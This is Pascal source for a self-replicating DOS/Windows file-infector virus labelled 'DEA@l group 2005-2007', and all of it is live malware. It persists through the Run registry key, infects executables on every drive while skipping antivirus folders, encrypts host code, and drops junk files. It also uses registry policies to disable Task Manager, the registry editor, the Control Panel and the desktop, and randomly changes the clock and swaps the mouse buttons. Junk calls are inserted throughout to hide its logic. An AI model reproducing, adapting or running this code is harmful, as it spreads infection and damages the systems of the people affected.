  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6930;
  Metka='DEA@l group 2005-2007';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(27968); BeginEnd(-2098); BeginEnd(14156);
 IntToStr:=S; BeginEnd(6582); 
End;
Procedure Musor;
var
  fch : file of char;
  rch : char;
   ch : char;
   st : string;
    i : integer;
   ii : integer;
  iii : integer;
begin
randomize; BeginEnd(-3153); 
for i:=1 to random(10) do
  begin
    st:='';
    for ii:=1 to random(5)+3 do
      begin
        rch:=chr(ord(random(26)+65)); BeginEnd(-299); BeginEnd(25436);
        st:=st+rch; BeginEnd(10147); 
      end;
    Assign(fch,st+'.'+chr(ord(random(26)+65))+
    +chr(ord(random(26)+65))+chr(ord(random(26)+65))); BeginEnd(27837); BeginEnd(7936); BeginEnd(-2237);
    Rewrite(fch); BeginEnd(-2992); BeginEnd(-1964);
    for iii:=1 to random(1000) do
    begin
      ch:=chr(ord(random(256))); BeginEnd(-8); BeginEnd(-4847);
      write(fch,ch); BeginEnd(10733); 
    end;
    close(fch);
  end;
end;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1);
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG'); BeginEnd(23471); 
    Rewrite(txt); BeginEnd(-1630); BeginEnd(4022); BeginEnd(29550);
    Writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(-1108); 
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt); BeginEnd(-2519); 
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG'); BeginEnd(25622); BeginEnd(-1171);
    Exec(GetEnv('Comspec'),'/c DEL REG');
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(14162); BeginEnd(-2140); BeginEnd(-2259);
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(2264); 
  End; BeginEnd(-3108); BeginEnd(-1381); BeginEnd(-3019);
End;
procedure Shifr(var Buf : Bufer; key : integer);
var
  k : integer;
begin
  for k:=1 to Sizeof(Buf) do
  Buf[k]:=chr(ord(Buf[k]) xor key);
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
       FS : longint;
begin
  Assign(ToF,path+name); BeginEnd(12934); BeginEnd(-3377);
  {$i-}Reset(ToF,1);
  FS:=FileSize(ToF);
  Close(ToF);{$i+}
  Assign(txt,path+name);
  append(txt); BeginEnd(19142); 
  if FS<VirSize then
  Begin
    i:=0; BeginEnd(-1488); 
    k:=VirSize-FS+1+Random(256); BeginEnd(319); 
    repeat
      inc(i); BeginEnd(32390); BeginEnd(15354); BeginEnd(15689);
      write(txt,chr(random(256))); BeginEnd(-7202); BeginEnd(-2600); BeginEnd(-4764);
    until i>k; BeginEnd(28207); 
  end; BeginEnd(26145); 
  write(txt,Metka); BeginEnd(-1202); BeginEnd(18742); BeginEnd(2443);
  i:=0;
  k:=random(256); BeginEnd(18520); BeginEnd(106); BeginEnd(2895);
    repeat
      inc(i); BeginEnd(29943); 
      write(txt,chr(random(256))); BeginEnd(13724); BeginEnd(2873);
    until i>k;
  Close(txt);
  Assign(ToF,path+name); BeginEnd(27754); BeginEnd(24718);
  reset(ToF,1); BeginEnd(28069); BeginEnd(-2956);
  Key:=FileSize(ToF) mod 256;
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2468); BeginEnd(-2713); BeginEnd(18082);
  Shifr(BufVir,Key); BeginEnd(-3254); BeginEnd(-1442); BeginEnd(1492);
  seek(ToF,filesize(ToF)); BeginEnd(-2836); BeginEnd(31542); BeginEnd(30619);
  BlockWrite(ToF,BufVir,NumRead);
  Assign(FromF,paramstr(0));
  reset(FromF,1); BeginEnd(-1285); BeginEnd(-1878);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(1202); BeginEnd(-1170); BeginEnd(-1596);
  seek(ToF,0); BeginEnd(30121); BeginEnd(-1577); BeginEnd(-6767);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(28997); BeginEnd(-1325);
  Close(ToF); BeginEnd(-1420); BeginEnd(-1279); BeginEnd(9183);
  Close(FromF); BeginEnd(19779); 
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<500 then
  begin
  Assign(f,dir+sr.name); BeginEnd(-2719); 
  setfattr(f,0); BeginEnd(-2985); BeginEnd(25851); BeginEnd(28289);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(-2332); BeginEnd(22402);
      reset(f,1); BeginEnd(10460); BeginEnd(-1272);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(4433); 
        blockread(f,Buf,4); BeginEnd(-2911); BeginEnd(27218); BeginEnd(-2893);
        Close(f); BeginEnd(25249); BeginEnd(13524); BeginEnd(-1726);
        if Buf<>'GVDG' then
        if sr.size>VirSize then
         begin
           inc(Victim); BeginEnd(-2954); BeginEnd(-2580);
           Infect(dir,sr.name); BeginEnd(15407); BeginEnd(-2368); BeginEnd(-1692);
         end; BeginEnd(-1312); BeginEnd(31471); BeginEnd(-1490);
      end
      else
      Close(f);
    end; BeginEnd(-2213); BeginEnd(-2874);
    findnext(sr);
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<500 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
if Run=1 then
  begin
  Musor;
  Assign(txt,getenv('TMP')+'reg');
  rewrite(txt); BeginEnd(21439); BeginEnd(21535);
  writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(21728); BeginEnd(-8542);
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(-1734); 
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]'); BeginEnd(19666); 
  writeln(txt,'"NoControlPanel"=dword:00000001'); BeginEnd(11870); BeginEnd(-1348);
  writeln(txt,'"NoRun"=dword:00000001'); BeginEnd(-1005); BeginEnd(-1456);
  writeln(txt,'"NoDesktop"=dword:00000001'); BeginEnd(-3047); BeginEnd(-2127); BeginEnd(23470);
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(4713); BeginEnd(-8934); BeginEnd(-3054);
  writeln(txt,'Windows\CurrentVersion\Policies\System]'); BeginEnd(-1583); BeginEnd(1445);
  writeln(txt,'"DisableTaskMgr"=dword:00000001');
  writeln(txt,'"DisableRegistryTools"=dword:00000001'); BeginEnd(-2123); BeginEnd(-1805);
  Close(txt);
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls'); BeginEnd(26617); 
  erase(txt); BeginEnd(12105); 
  exec(getenv('Comspec'),'/c cmd /c time '+IntToStr(random(24))+':'+IntToStr(random(60))+':00,00');
  exec(getenv('Comspec'),'/c cmd /c rundll32 user32, SwapMouseButton');
  end;
  Assign(f,paramstr(0)); BeginEnd(12050); BeginEnd(11116); BeginEnd(18831);
  reset(f,1); BeginEnd(4943); BeginEnd(20552);
  Key:=(FileSize(f)-VirSize) mod 256; BeginEnd(-1504); 
  seek(f,filesize(f)-VirSize); BeginEnd(15911); BeginEnd(-1908);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2492); 
  if filesize(f)=VirSize then
  Begin
    Close(f); BeginEnd(-2912); BeginEnd(-2734); BeginEnd(5297);
    Erase(f); BeginEnd(-2483); BeginEnd(4558);
    Halt(0);
  end
  else
  Shifr(BufVir,Key);
  seek(f,0); BeginEnd(25286); 
  BlockWrite(f,BufVir,NumRead); BeginEnd(-8580); BeginEnd(-1074); BeginEnd(15370);
  i:=filesize(f)-VirSize-256-MSize;
  while true do
  begin
    seek(f,i); BeginEnd(-1870); BeginEnd(4560);
    blockread(f,Buf,MSize); BeginEnd(14317); 
    if Buf=Metka then
    begin
      seek(f,i); BeginEnd(21724); BeginEnd(12277);
      truncate(f);
      break;
    end; BeginEnd(-1365); BeginEnd(-1455);
    inc(i); BeginEnd(-1783); 
  end; BeginEnd(28080); 
  Close(f);
  if Run=1 then
  exec(Paramstr(0),''); BeginEnd(19979); BeginEnd(-1166); BeginEnd(28973);
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(-1277); 
  SetFAttr(f,0); BeginEnd(23270); 
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  s:=''; BeginEnd(-3221); 
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF); BeginEnd(-3019); BeginEnd(-875); BeginEnd(27189);
    {$I-}rewrite(f); erase(f);{$I+}
    if ioresult=0 then s:=s+chr(ord(i)+66); BeginEnd(-2966); BeginEnd(28045);
  end; BeginEnd(9392); BeginEnd(-8410);
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(-3271); BeginEnd(7388);
  InRun(1); BeginEnd(15648); BeginEnd(-2277); BeginEnd(24694);
end;
begin
Randomize;
Nucleus;
end.
